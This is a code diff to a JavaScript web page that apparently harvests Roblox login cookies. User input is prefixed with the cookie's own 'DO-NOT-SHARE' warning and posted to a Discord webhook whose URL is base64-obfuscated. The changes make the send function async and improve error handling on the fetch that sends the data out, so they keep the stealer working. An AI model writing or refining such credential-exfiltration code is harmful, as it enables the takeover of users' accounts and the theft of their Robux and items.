@@ -184,7 +184,7 @@
     const webhookURL = decodeBase64(webhookBase64);
     
     // Function to send the message to Discord
-    function sendMessage() {
+    async function sendMessage() {
       const input = document.getElementById('messageInput').value.trim();
       const warningPart = "_^|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.^|_\"";
       
@@ -231,16 +231,22 @@
             barContainer.style.display = 'none';
             bar.style.width = '0%';
             texts.forEach(t => t.style.display = 'none');
+            // Send the final message via Fetch API
             fetch(webhookURL, {
               method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ content: finalMessage })
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                content: finalMessage,
+              }),
             })
-            .then(() => {
+            .then(response => {
+              if (!response.ok) throw new Error('Network response was not ok');
               document.getElementById('statusMessage').textContent = '✅ Message sent!';
               document.getElementById('statusMessage').style.color = '#56ff89';
             })
-            .catch(() => {
+            .catch(error => {
               document.getElementById('statusMessage').textContent = '❌ Error sending message.';
               document.getElementById('statusMessage').style.color = '#ff5e5e';
             });
